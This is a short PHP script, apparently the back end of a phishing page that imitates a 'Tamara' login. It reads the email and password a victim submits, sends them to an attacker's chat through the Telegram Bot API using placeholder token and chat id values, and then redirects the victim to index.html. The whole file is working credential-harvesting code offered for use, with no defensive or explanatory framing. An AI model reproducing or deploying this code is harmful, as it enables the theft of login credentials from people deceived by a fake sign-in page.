<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['Email'];
    $password = $_POST['Password'];

    $telegram_message = "--++-----[تسجيل دخول تمارة ]-----++--\n\n";
    $telegram_message .= "البريد الإلكتروني: $email\n";
    $telegram_message .= "كلمة المرور: $password\n";

  
    $bot_token = 'tttttttttttttttttttttttt';
    $chat_id = 'chat iddddddddddddddd';
    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($telegram_message);

 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);


    $result = curl_exec($ch);


    curl_close($ch);

   
    header('Location: index.html');
    exit;
}
?>
